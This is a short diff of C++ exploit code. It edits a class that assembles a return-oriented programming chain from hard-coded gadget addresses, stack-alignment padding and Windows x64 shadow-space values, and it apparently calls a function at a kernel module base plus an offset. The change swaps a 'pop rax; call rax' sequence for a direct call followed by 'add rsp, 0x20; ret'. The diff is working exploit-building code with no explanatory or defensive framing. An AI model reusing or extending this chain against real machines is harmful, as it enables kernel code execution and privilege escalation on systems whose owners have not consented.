@@ -69,20 +69,14 @@ public:
             }
         }
 
-        if (this->GetStackSize() % 16 == 0)
+        if (this->GetStackSize() % 16 != 0)
             this->AddGadget(0x20043b, "ret (align)");
 
-        //this->AddGadget(FunctionAddress, "Function to call address");
-        //this->AddGadget(0xbad76a, "add rsp, 0x20; ret;");
-        //this->AddValue(0, "Shadow space 1");
-        //this->AddValue(0, "Shadow space 2");
-        //this->AddValue(0, "Shadow space 3");
-        //this->AddValue(0, "Shadow space 4");
-
-        this->AddGadget(0x210e10, "pop rax; ret;"); // pop rax; ret;
-        this->AddValue(KernelModuleBase + FunctionAddress, "Function to call addr");
-        //this->AddGadget(0x20043b, "ret;"); // ret; (align rsp)
-        this->AddGadget(0x52c005, "call rax; nop dword ptr [rax]; add rsp, 0x28; ret;"); // call rax; nop dword ptr [rax]; add rsp, 0x28; ret;
-        this->AddPadding(0x28);
+        this->AddGadget(FunctionAddress, "Function to call address");
+        this->AddGadget(0xbad76a, "add rsp, 0x20; ret;");
+        this->AddValue(0, "Shadow space 1");
+        this->AddValue(0, "Shadow space 2");
+        this->AddValue(0, "Shadow space 3");
+        this->AddValue(0, "Shadow space 4");
     }
 };
